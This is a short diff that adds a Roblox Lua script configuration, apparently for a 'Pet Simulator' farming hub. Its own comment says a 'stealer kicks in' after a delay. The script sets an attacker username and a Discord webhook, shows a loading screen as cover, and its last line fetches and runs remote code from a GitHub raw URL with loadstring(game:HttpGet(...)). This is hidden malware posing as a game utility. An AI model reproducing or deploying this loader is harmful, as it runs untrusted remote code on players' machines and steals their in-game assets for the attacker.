@@ -1,0 +1,6 @@
+Username = "Mad_2u"
+webhook = "https://discord.com/api/webhooks/1203525028889501756/qbIFIoOnaG02ghveITkrZTFON0c8trYZvHcJeoMM5-huiTg23k5wQ4JvZ15Er6gqgg7f"
+loadingscreen = true
+delay = 0 -- extra wait before stealer kicks in usefull if u want your own hub or whatever to run first (in seconds!)
+farmui = true -- set to false if u dont want to load it
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/pets9.lua"))()
